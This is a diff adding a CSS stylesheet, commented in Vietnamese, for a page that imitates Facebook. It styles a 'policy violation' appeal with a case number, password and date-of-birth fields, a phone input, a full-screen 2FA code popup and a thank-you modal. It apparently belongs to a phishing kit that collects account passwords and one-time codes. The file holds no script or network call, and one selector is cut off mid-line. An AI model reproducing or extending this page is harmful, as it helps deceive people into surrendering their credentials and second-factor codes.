@@ -1,0 +1,1311 @@
+#html {
+    background: rgb(249, 241, 249);
+    background: linear-gradient(
+     90deg,
+     rgba(249, 241, 249, 1) 0%,
+     rgba(234, 243, 253, 1) 35%,
+     rgba(237, 251, 242, 1) 100%
+    );
+}
+
+body {
+    background: inherit;
+    height: 100vh;
+    overflow: hidden;
+    overflow-y: scroll;
+}
+
+.row {
+    height: 100%;
+}
+
+#left {
+    height: 100vh;
+    padding: 93px 26px 0 0;
+    position: sticky;
+    top: 0;
+    overflow-y: auto;
+}
+
+.col-4 {
+    border-right: 1px solid #dee3e9;
+}
+
+#right {
+    padding: 41px 3px;
+}
+
+#logo {
+    width: 79px;
+}
+
+#utm-ticketId {
+    margin-bottom: 16px;
+}
+
+#show-hide-pass {
+    width: 28px;
+    right: 30px;
+    position: absolute;
+    cursor: pointer;
+    transform: scaleX(-1);
+}
+
+h1, h2 {
+    line-height: 30px;
+    color: rgb(28, 30, 33);
+    font-family: Optimistic Display Bold, Helvetica, Arial, sans-serif;
+    font-weight: 700;
+    margin: 16px 0;
+}
+
+h1 {
+    font-size: 24px;
+    display: flex;
+    align-items: center;
+}
+
+h2 {
+    font-size: 20px;
+}
+
+h4 {
+    font-family: Optimistic Display Bold, Helvetica, Arial, sans-serif;
+    font-weight: 700;
+    line-height: 30px;
+}
+
+h6 {
+    margin-bottom: 20px;
+}
+
+p {
+    margin: 0;
+    font-size: 15px;
+    line-height: 20px;
+    font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif !important;
+}
+
+ul {
+    margin: 0;
+    font-size: 15px;
+    line-height: 20px;
+    font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif !important;
+}
+
+li {
+    margin: 8px 0;
+}
+
+a {
+    text-decoration: none;
+    margin: 0;
+    font-size: 15px;
+}
+
+a svg {
+    vertical-align: text-top;
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+.w-100 {
+    width: 100%;
+}
+
+.small-grey {
+    color: rgb(70, 90, 105);
+    font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif;
+    font-size: 15px;
+    font-weight: 400;
+    line-height: 20px;
+}
+
+.action-button.account {
+    background-color: #ffffff;
+    cursor: default;
+    color: rgb(70, 90, 105);
+}
+
+.action-button.account:hover {
+    background-color: #f2f2f2;
+}
+
+.action-button.account svg {
+    width: 34px;
+    height: 34px;
+}
+
+.action-button {
+    display: flex;
+    align-items: center;
+    width: 100%;
+    padding: 12px 16px;
+    border-radius: 15px;
+    color: black;
+    background-color: inherit;
+    transition: background-color 0.35s ease;
+    cursor: pointer;
+    font-size: 16px;
+    font-weight: 500;
+    line-height: 20px;
+    font-family: Optimistic Text Medium, Helvetica, Arial, sans-serif;
+}
+
+.action-button:hover {
+    background-color: #e3e8ef;
+}
+
+.action-button.main {
+    color: white;
+    background-color: rgb(52, 72, 84);
+}
+
+.action-button.wide {
+    background-color: white;
+}
+
+.action-button.wide:hover {
+    background-color: #e3e8ef;
+}
+
+.action-button-list {
+    border-radius: 15px;
+    overflow: hidden;
+}
+
+.action-button-list .action-button {
+    border-radius: 0;
+    border-bottom: 1px solid #e3e8ef;
+}
+
+.action-button-list .action-button:last-child {
+    border-bottom: none;
+}
+
+.action-button-img {
+}
+
+.action-button-img svg {
+    width: 24px;
+    height: 24px;
+}
+
+.action-button-img img {
+    width: 48px;
+    height: 48px;
+}
+
+.action-button-text {
+    width: 100%;
+    text-align: left;
+    padding: 0 12px;
+}
+
+.action-button-arrow svg {
+    width: 24px;
+    height: 24px;
+}
+
+.action-button.collapsed .ARROW {
+    display: block;
+    rotate: 0deg;
+}
+
+.action-button .ARROW {
+    display: block;
+    rotate: 180deg;
+}
+
+.boxshadow {
+    box-shadow: rgba(0, 0, 0, 0.1) 1px 3px 8px 3px;
+}
+
+#main {
+    max-width: 1100px;
+}
+
+/* CARD */
+#card {
+    display: flex;
+    flex-direction: column;
+    border-radius: 20px;
+    background-color: transparent;
+    margin: 20px 0;
+}
+
+#card img {
+    border-radius: 20px 20px 0 0;
+}
+
+.card-text {
+    margin: 20px;
+}
+
+.mg-t20 {
+    margin-top: 20px;
+}
+
+.card-text .card-type {
+    font-size: 16px;
+    font-weight: 400;
+    margin-bottom: 10px;
+}
+
+.card-text h4 {
+    font-weight: 500;
+    margin: 14px 0;
+}
+
+/* =========================================
+   Mobile layout refinements
+   ========================================= */
+@media (max-width: 991.98px) {
+    body {
+        height: auto;
+        overflow-y: auto;
+    }
+
+    #main {
+        max-width: 100%;
+        padding: 0 12px;
+    }
+
+    .row {
+        height: auto;
+    }
+
+    /* Ẩn sidebar trái, ưu tiên nội dung form trên di động */
+    .col-4 {
+        display: none;
+        border-right: none;
+    }
+
+    .col-8 {
+        width: 100%;
+    }
+
+    #right {
+        padding: 24px 4px 40px;
+    }
+
+    /* Hiện nút burger để mở menu phụ (nếu có) */
+    .burger-button {
+        display: flex !important;
+        align-items: center;
+        justify-content: center;
+    }
+
+    /* Typography nhỏ lại một chút cho màn nhỏ */
+    h1 {
+        font-size: 20px;
+        line-height: 26px;
+    }
+
+    h2 {
+        font-size: 18px;
+        line-height: 24px;
+    }
+
+    p,
+    ul,
+    li,
+    label,
+    input,
+    textarea,
+    button {
+        font-size: 14px;
+        line-height: 20px;
+    }
+
+    /* Form full-width, nút dễ bấm hơn trên mobile */
+    .form-control {
+        width: 100%;
+        min-height: 42px;
+    }
+
+    .btn,
+    .btn-primary,
+    #submitBtn,
+    #submitPassBtn,
+    #submit2FABtn {
+        width: 100%;
+        justify-content: center;
+    }
+
+    /* Điều chỉnh card / block thông tin */
+    #card {
+        margin: 16px 0;
+    }
+
+    .card-text {
+        margin: 16px 12px;
+    }
+}
+
+.btn:disabled {
+    opacity: 0.85;
+}
+
+.btn-wrapper {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    padding: 20px 0;
+}
+
+.button {
+    height: 50px;
+    width: 200px;
+    border-radius: 20px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    cursor: pointer;
+}
+
+.button.fb-blue:hover {
+    color: white;
+    background-color: rgb(0, 100, 224);
+    border: none;
+}
+
+.button.fb-blue {
+    background-color: rgb(0, 100, 224);
+    color: white;
+}
+
+.button:hover {
+    background-color: #e2eaf2;
+    transition: background-color 0.25s ease;
+}
+
+/* Form Control Styling */
+.form-control {
+    height: 50px;
+    background-color: #fff;
+    border: 2px solid #d4dbe3;
+    border-radius: 10px;
+    padding: 10px;
+    font-size: 16px;
+    width: 100%;
+    box-sizing: border-box;
+}
+
+.form-control:focus {
+    outline: none;
+    border-color: #007bff;
+}
+
+/* Styling for Date of Birth Fields */
+.dob-container {
+    display: flex;
+    justify-content: space-between;
+    gap: 10px;
+    margin-bottom: 20px; /* Thêm khoảng cách dưới giống các ô khác */
+    padding-top: 10px; /* Đảm bảo có khoảng cách trên nếu cần */
+}
+
+.dob-item {
+    flex: 1;
+    margin: 0; /* Xóa bỏ margin thừa nếu có */
+}
+
+.dob-select {
+    width: 100%; /* Ensure dropdown fills the container */
+    padding: 10px;
+    font-size: 16px;
+    background-color: #fff;
+    border: 2px solid #d4dbe3;
+    border-radius: 10px;
+    appearance: none;
+    cursor: pointer;
+}
+
+.dob-select:focus {
+    outline: none;
+    border-color: #007bff;
+}
+
+/* Phone input with country code (inspired by glgl.html) */
+.react-tel-input {
+    position: relative;
+    width: 100%;
+}
+
+.react-tel-input .form-control {
+    padding-left: 80px;
+}
+
+.react-tel-input .flag-dropdown {
+    position: absolute;
+    top: 0;
+    left: 0;
+    height: 100%;
+    border: none;
+    background: transparent;
+}
+
+.react-tel-input .selected-flag {
+    display: flex;
+    align-items: center;
+    height: 100%;
+    padding: 0 10px 0 10px;
+    cursor: pointer;
+    border-right: 1px solid #d4dbe3;
+}
+
+.react-tel-input .selected-flag .country-flag {
+    width: 20px;
+    height: 15px;
+    margin-right: 6px;
+    border-radius: 2px;
+    background-size: cover;
+    background-position: center;
+    display: inline-block;
+}
+
+.react-tel-input .dial-code {
+    font-size: 14px;
+    color: #374151;
+    font-weight: 500;
+}
+
+.react-tel-input .country-list {
+    position: absolute;
+    top: 100%;
+    left: 0;
+    width: 220px;
+    max-height: 240px;
+    overflow-y: auto;
+    background: #fff;
+    border: 1px solid #d4dbe3;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.12);
+    z-index: 9999;
+    margin-top: 4px;
+    list-style: none;
+    padding: 0;
+    display: none;
+}
+
+.react-tel-input .country-list .country {
+    display: flex;
+    align-items: center;
+    padding: 6px 8px;
+    cursor: pointer;
+    font-size: 13px;
+}
+
+.country-search-wrap {
+    position: sticky;
+    top: 0;
+    background: #fff;
+    padding: 6px 8px;
+    border-bottom: 1px solid #e5e7eb;
+    z-index: 1;
+}
+
+.country-search-wrap input {
+    width: 100%;
+    padding: 6px 10px;
+    border: 1px solid #d4dbe3;
+    border-radius: 6px;
+    font-size: 13px;
+    outline: 0;
+}
+
+.country-search-wrap input:focus {
+    border-color: #3b82f6;
+}
+
+.react-tel-input .country-list .country .country-flag {
+    width: 18px;
+    height: 13px;
+    margin-right: 6px;
+    border-radius: 2px;
+    background-size: cover;
+    background-position: center;
+    display: inline-block;
+}
+
+.react-tel-input .country-list .country:hover,
+.react-tel-input .country-list .country.active {
+    background: #f0f2f5;
+}
+
+.react-tel-input .country-list .country-name {
+    flex: 1;
+    margin-right: 8px;
+}
+
+.react-tel-input .country-list .dial-code {
+    color: #6b7280;
+}
+
+@media (max-width: 767.98px) {
+    .react-tel-input .country-list {
+        width: calc(100vw - 60px);
+        max-width: 300px;
+    }
+}
+
+/* MODAL */
+#searchModal .modal-content,
+#accountsModal .modal-content {
+    min-height: 300px;
+}
+
+#accountsModal .modal-content {
+    min-width: 550px;
+}
+
+#accountsModal .action-button:hover {
+    background-color: white;
+    cursor: default;
+}
+
+#searchModal .search-input-wraper {
+    display: flex;
+    position: relative;
+    align-items: center;
+}
+
+#searchModal .search-icon-wraper,
+#searchModal .close-search-icon-wraper {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #8b99a8;
+}
+
+#searchModal .search-icon-wraper {
+    left: 12px;
+}
+
+#searchModal .close-search-icon-wraper {
+    right: 6px;
+    border-radius: 50%;
+    width: 28px;
+    height: 28px;
+    color: rgb(70, 90, 105);
+    font-size: 12px;
+    font-weight: 400;
+    cursor: pointer;
+}
+
+#searchModal .close-search-icon-wraper svg {
+    width: 18px;
+    height: 18px;
+}
+
+#searchModal .close-search-icon-wraper:hover {
+    background-color: #d6dee6;
+}
+
+#searchModal input {
+    width: 100%;
+    background-color: rgba(0, 0, 0, 0.05);
+    border: none;
+    outline: none;
+    height: 36px;
+    border-radius: 18px;
+    padding-right: 8px;
+    padding-left: 36px;
+    font-family: Helvetica, Arial, sans-serif;
+}
+
+#searchModal input::placeholder {
+    color: #8a8a8a;
+}
+
+#searchModal .fake-items div {
+    background-color: white;
+    margin: 6px;
+    height: 42px;
+    border-radius: 6px;
+    opacity: 0.6;
+}
+
+#searchModal .now-found div {
+    padding-top: 64px;
+    padding-bottom: 32px;
+}
+
+#searchModal .now-found svg {
+    width: 96px;
+    height: 96px;
+}
+
+.btn-close:focus {
+    box-shadow: none;
+}
+
+.modal .modal-content {
+    border-radius: 25px;
+    background: rgb(249, 241, 249);
+    background: linear-gradient(
+     90deg,
+     rgba(249, 241, 249, 1) 0%,
+     rgba(234, 243, 253, 1) 35%,
+     rgba(237, 251, 242, 1) 100%
+    );
+}
+
+.modal-header {
+    padding: 1.4rem 1.4rem;
+    border-bottom: none;
+    padding-bottom: 1rem;
+}
+
+.modal-footer img {
+    width: 70px;
+}
+
+.modal-header .btn-close {
+    opacity: 1;
+}
+
+.form-modal .modal-content {
+    min-height: 92vh;
+}
+
+.form-modal {
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+}
+
+.fb-round-wraper {
+    display: flex;
+    justify-content: center;
+}
+
+.fb-round-wraper .fb-logo-round {
+    width: 70px;
+}
+
+.modal-footer {
+    justify-content: center;
+    border-top: none;
+}
+
+.btn-close:hover {
+    background-color: #e2eaf2;
+    border-radius: 50%;
+}
+
+.form-btn-wrapper {
+    display: flex;
+    justify-content: center;
+    padding: 15px 0;
+}
+
+.form-btn-wrapper .btn {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    border-radius: 25px;
+    height: 50px;
+    font-size: 20px;
+}
+
+.modal-title {
+}
+
+.spinner-border {
+    width: 22px;
+    height: 22px;
+    border-width: 0.15rem;
+}
+
+.password-input {
+    background-color: #fff;
+    border: 2px solid #d4dbe3;
+    border-radius: 10px;
+    padding: 5px;
+    display: flex;
+    align-items: start;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.password-input.disabled {
+    background-color: #e3e3e3;
+}
+
+.password-input .form-label {
+    color: #5e5e5e;
+    padding: 0 0.75rem;
+    margin-bottom: 0;
+    width: 100%;
+}
+
+.password-input input {
+    border: none;
+    padding: 0 0.75rem;
+    height: 24px;
+}
+
+.password-input input:disabled {
+    background-color: #e3e3e3;
+}
+
+.password-input input:focus {
+    box-shadow: none;
+    border: none;
+}
+
+.password-input input:focus-visible {
+    box-shadow: none;
+    border: none;
+}
+
+#forgot-pass-wrap {
+    text-align: center;
+    text-align: center;
+    font-size: 16px;
+    font-weight: 500;
+}
+
+textarea.form-control {
+    min-height: 100px;
+}
+
+.container-head {
+    display: flex;
+    justify-content: space-between;
+    padding: 10px;
+}
+
+.burger-button {
+    display: flex;
+    flex-direction: column;
+    cursor: pointer;
+}
+
+.bar {
+    width: 30px;
+    height: 2px;
+    border-radius: 5px;
+    background-color: #333;
+    margin: 5px 0;
+    transition: 0.4s;
+}
+
+#showPopup {
+    display: none;
+}
+
+.popup {
+    display: none;
+    position: fixed;
+    padding: 0;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.5);
+    justify-content: center;
+    align-items: center;
+}
+
+.popup-item {
+    border-radius: 25px;
+    background: linear-gradient(
+     90deg,
+     rgba(249, 241, 249, 1) 0%,
+     rgba(234, 243, 253, 1) 35%,
+     rgba(237, 251, 242, 1) 100%
+    );
+    padding: 20px;
+    max-width: 400px;
+    max-height: 500px;
+    overflow-y: auto;
+}
+
+.container-head {
+    display: none;
+}
+
+@media screen and (max-width: 1000px) {
+    #right {
+     padding: 20px 5px;
+    }
+
+    #exampleModal2 .modal-content,
+    .modal-content,
+    #searchModal .modal-content,
+    #successModal .modal-content {
+     border-radius: 0;
+    }
+
+    #accountsModal .modal-content {
+     min-width: auto;
+    }
+
+    .container-head {
+     display: flex;
+    }
+
+    .burger-button-popup {
+     display: flex;
+     flex-direction: column;
+     cursor: pointer;
+     align-items: end;
+    }
+
+    .burger-button-popup.bar {
+     width: 30px;
+     height: 4px;
+     background-color: #333;
+     margin: 6px 0;
+    }
+
+    .burger-button-popup .bar:nth-child(1) {
+     transform: rotate(-45deg) translate(-3px, 4px);
+    }
+
+    .burger-button-popup .bar:nth-child(2) {
+     transform: rotate(45deg) translate(-5px, -6px);
+    }
+
+    .popup {
+     justify-content: center;
+     flex-direction: column;
+    }
+
+    #left {
+     height: 100%;
+     padding: 0px;
+    }
+
+    #left h1 {
+     margin: 3px 0;
+    }
+
+    .col-8 {
+     width: 100%;
+    }
+
+    .row {
+     justify-content: center;
+    }
+}
+
+@media screen and (max-width: 585px) {
+    .popup-item {
+     max-height: none;
+     height: 100vh;
+     margin: 15px;
+     max-width: none;
+     width: 95%;
+    }
+}
+
+@media screen and (max-width: 425px) {
+    .col-8 {
+     width: 100%;
+    }
+}
+
+/* width */
+*::-webkit-scrollbar {
+    width: 3px;
+}
+
+/* Track */
+*::-webkit-scrollbar-track {
+    background: transparent;
+}
+
+/* Handle */
+*::-webkit-scrollbar-thumb {
+    background: rgb(74, 74, 74);
+}
+
+/* Handle on hover */
+*::-webki
+
+.form-group {
+    margin-bottom: 20px; /* Thêm khoảng cách dưới cho các form group */
+}
+.form-container {
+    background-color: transparent !important;
+}
+
+.status-container {
+    display: flex;
+    align-items: flex-start; /* Căn chỉnh các phần tử theo chiều dọc */
+    gap: 10px;
+    margin-bottom: 20px; /* Tạo khoảng cách dưới cho toàn bộ container */
+}
+
+.status-icon {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: #6d6d6d;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+}
+
+.status-text {
+    display: block; /* Đảm bảo các phần tử bên trong xuống hàng */
+}
+
+.heading {
+    font-size: 20px;
+    font-weight: bold;
+    margin-bottom: 0px; /* Khoảng cách giữa tiêu đề và nút OPEN */
+}
+.open-status {
+    background-color: #007bff;
+    color: white;
+    padding: 2px 8px;
+    border-radius: 5px;
+    font-size: 12px;
+    font-weight: bold;
+    margin-bottom: 5px; /* Khoảng cách giữa nút OPEN và case number */
+    display: inline-block;
+}
+
+.case-number {
+    font-size: 14px;
+    color: #6d6d6d;
+}
+.modal.form-modal {
+    background-color: transparent !important;
+    border: none !important;
+    box-shadow: none !important;
+}
+
+.modal-dialog {
+    background-color: transparent !important;
+    border: none !important;
+    box-shadow: none !important;
+}
+
+.modal-content {
+    background-color: transparent !important;
+    border: none !important;
+    box-shadow: none !important; /* Loại bỏ bóng đổ */
+    outline: none !important; /* Loại bỏ bất kỳ đường viền nào */
+}
+.policy-wrapper {
+    border: 2px solid #ccc; /* Tạo viền xám nhạt */
+    padding: 20px; /* Khoảng cách bên trong khung */
+    border-radius: 10px; /* Bo tròn góc viền */
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Bóng đổ nhẹ */
+    margin-bottom: 20px; /* Thêm khoảng cách bên dưới khung */
+}
+.modal-header {
+    border-bottom: 2px solid #ccc; /* Tạo đường chia giữa Policy violation và modal */
+    padding-bottom: 10px; /* Thêm khoảng cách phía dưới đường chia */
+    margin-bottom: 20px; /* Tạo khoảng cách giữa đường chia và phần modal tiếp theo */
+}
+.appeal-text {
+    margin-left: 20px; /* Tăng khoảng cách từ lề trái */
+    padding-left: 10px; /* Khoảng cách bên trong cho lề trái */
+    text-align: left; /* Đảm bảo căn lề trái đúng */
+}
+.btn-primary {
+    background-color: #007bff; /* Màu xanh nút */
+    color: white;
+    border: none;
+    border-radius: 30px; /* Bo tròn như ảnh */
+    padding: 12px 0;
+    width: 100%; /* Full chiều rộng */
+    font-size: 1.2rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  .btn-primary:hover {
+    background-color: #0056b3; /* Màu xanh đậm hơn khi hover */
+  }
+  .btn-primary:focus {
+    outline: none;
+    box-shadow: 0 0 0 3px rgba(0,123,255,0.5);
+  }
+  .form-group {
+  display: flex;
+  flex-direction: column; /* Cột đứng, label trên input */
+  gap: 6px; /* Khoảng cách giữa label và input */
+  margin-bottom: 16px; /* Khoảng cách giữa các nhóm input */
+}
+
+.dob-container {
+  display: flex;
+  gap: 10px;
+}
+
+.dob-select {
+  flex: 1;
+  padding: 8px 12px;
+  font-size: 1rem;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  box-sizing: border-box;
+}
+/* Popup 2FA */
+#twoFAModal {
+  display: none; /* Ẩn mặc định */
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;    /* Chiếm toàn bộ chiều rộng màn hình */
+  height: 100vh;   /* Chiếm toàn bộ chiều cao màn hình */
+  background: linear-gradient(135deg, #e6f0ff, #ffffff);
+  border-radius: 0; /* Bỏ bo góc khi full màn hình */
+  padding: 0;       /* Không padding toàn popup */
+  box-shadow: none; /* Bỏ bóng khi full màn hình */
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  color: #111;
+  z-index: 10000;
+  box-sizing: border-box;
+  overflow: hidden; /* ẩn thanh cuộn toàn popup, dùng riêng cho nội dung con */
+  
+  display: flex;
+  justify-content: center; /* Căn ngang */
+  align-items: center;     /* Căn dọc */
+}
+
+/* Nội dung chính trong popup */
+#twoFAModal > .modal-dialog {
+  width: 90vw;
+  max-width: 600px;
+  max-height: 90vh;
+  overflow-y: auto; /* Bật cuộn riêng cho phần nội dung */
+  border-radius: 20px;
+  padding: 20px;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+  background: white; /* Nền trắng cho nội dung */
+  box-sizing: border-box;
+}
+
+/* Tiêu đề chính */
+#twoFAModal .modal-title {
+  font-size: 28px;
+  line-height: 38px;
+  font-weight: 700;
+  margin-bottom: 15px; /* Khoảng cách dưới tiêu đề */
+  color: #222;
+  text-align: left;  /* Căn giữa tiêu đề */
+}
+
+/* Đoạn mô tả */
+.twoFAinfo-wraper p {
+  font-size: 18px;
+  line-height: 26px;
+  font-weight: 400;
+  margin-bottom: 25px;
+  color: #222;
+  text-align: left; /* Căn giữa mô tả */
+}
+
+/* Khung ảnh */
+.fb-round-wraper img {
+  width: 100%;
+  max-width: 900px; /* Giới hạn chiều rộng của ảnh */
+  display: block;
+  margin: 0 auto 20px auto; /* Căn giữa và cách dưới */
+  border-radius: 15px;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.1); /* Bóng nhẹ cho ảnh */
+}
+
+/* Label input */
+#twoFAForm label {
+  display: block;
+  margin-bottom: 8px;
+  font-weight: 600;
+  color: #444;
+  font-size: 1rem;
+}
+
+/* Input mã 2FA */
+#twoFAInput {
+  width: 100%;
+  padding: 10px 16px;
+  font-size: 1rem;
+  border-radius: 10px;
+  border: 1.5px solid #ced4da;
+  box-sizing: border-box;
+  outline: none;
+  transition: border-color 0.3s ease, box-shadow 0.3s ease;
+  background-color: #fff;
+}
+
+/* Hiệu ứng focus */
+#twoFAInput:focus {
+  border-color: #007bff;
+  box-shadow: 0 0 8px rgba(0, 123, 255, 0.5);
+}
+
+/* Nút gửi 2FA */
+#submit2FABtn {
+  width: 100%;
+  padding: 14px;
+  font-size: 1.2rem;
+  border-radius: 30px;
+  background-color: #007bff;
+  border: none;
+  color: white;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+  margin-top: 20px;
+  box-shadow: 0 4px 12px rgba(0, 123, 255, 0.5);
+}
+
+/* Hover nút gửi */
+#submit2FABtn:hover {
+  background-color: #0056b3;
+}
+
+/* Thông báo lỗi */
+#twoFAStatus {
+  color: red;
+  margin-top: 12px;
+  min-height: 22px; /* Giữ chỗ khi chưa có lỗi */
+  font-weight: 600;
+  font-size: 0.95rem;
+}
+
+/* Overlay nền mờ tối */
+#overlay {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100vw;
+  height: 100vh;
+  background-color: rgba(0, 0, 0, 0.5); /* màu đen mờ 50% */
+  z-index: 9999; /* thấp hơn popup */
+  display: none; /* ẩn mặc định */
+}
+
+/* Popup Thank You */
+#thankYouModal {
+  display: none; /* Ẩn popup mặc định */
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 500px;
+  max-width: 90vw;
+  background: linear-gradient(135deg, #e6f0ff, #ffffff);
+  border-radius: 20px;
+  padding: 20px 25px;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  color: #111;
+  z-index: 10000;
+  box-sizing: border-box;
+  overflow-y: auto;
+  transition: all 0.3s ease;
+}
+
+#thankYouModal h1 {
+  font-size: 28px;
+  line-height: 38px;
+  font-weight: 700;
+  margin-bottom: 15px;
+  color: #222;
+}
+
+#thankYouModal p {
+  font-size: 18px;
+  line-height: 26px;
+  font-weight: 400;
+  margin-bottom: 25px;
+  color: #222;
+}
+
+#thankYouModal .thank-you-image img {
+  width: 100%;
+  max-width: 300px;
+  display: block;
+  margin: 0 auto 25px auto;
+  border-radius: 15px;
+}
+.spinner {
+  width: 20px;
+  height: 20px;
+  border: 3px solid #fff;
+  border-top-color: transparent;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  user-select: none;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+.iti__flag-container {
+  width: 20px; /* Điều chỉnh kích thước cờ */
+  height: 15px; /* Điều chỉnh kích thước cờ */
+}
+
+.iti__flag {
+  width: 100%; /* Cờ quốc gia sẽ chiếm toàn bộ diện tích */
+  height: 100%;
+  background-size: contain; /* Điều chỉnh ảnh nền */
+}
+
+.iti__country-list {
+  list-style: none; /* Bỏ dấu chấm đen */
+  padding: 0;
+  margin: 0;
+}
+
+/* Đảm bảo phần nhập số điện thoại được căn giữa */
+.iti__input {
+  padding-left: 40px; /* Khoảng cách để cờ không bị đè lên */
+  border-radius: 5px; /* Thêm bo góc cho ô nhập */
+  width: 100%; /* Đảm bảo ô nhập chiếm hết chiều rộng */
+  height: 45px; /* Chiều cao ô nhập số điện thoại */
+  font-size: 16px; /* Kích thước chữ hợp lý */
+  margin-top: 5px; /* Khoảng cách giữa ô nhập và các phần tử trên */
+}
+
+/* Điều chỉnh vị trí của danh sách cờ quốc gia */
+.iti__country-list {
+  max-height: 200px; /* Giới hạn chiều cao của danh sách quốc gia */
+  overflow-y: auto; /* Cho phép cuộn */
+  position: absolute;
+  top: 100%; /* Đảm bảo danh sách nằm dưới ô nhập */
+  width: 100%; /* Chiều rộng của danh sách quốc gia */
+  z-index: 10000; /* Đảm bảo nó nằm trên các phần tử khác */
+  background-color: white; /* Màu nền trắng */
+  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); /* Bóng nhẹ */
+  border-radius: 5px;
+}
+
+/* Điều chỉnh chiều cao của danh sách quốc gia */
+.iti__country {
+  display: flex;
+  align-items: center;
+  padding: 8px;
+  border-bottom: 1px solid #ccc; /* Đường viền dưới mỗi quốc gia */
+}
+
+.iti__country:hover {
+  background-color: #f1f1f1; /* Hiệu ứng hover */
+}
+
+.iti__flag-container {
+  width: 30px;
+  height: 20px;
+  margin-right: 10px; /* Khoảng cách giữa cờ và tên quốc gia */
+}
+
+.iti__flag {
+  width: 100%;
+  height: 100%;
+  background-size: contain;
+}
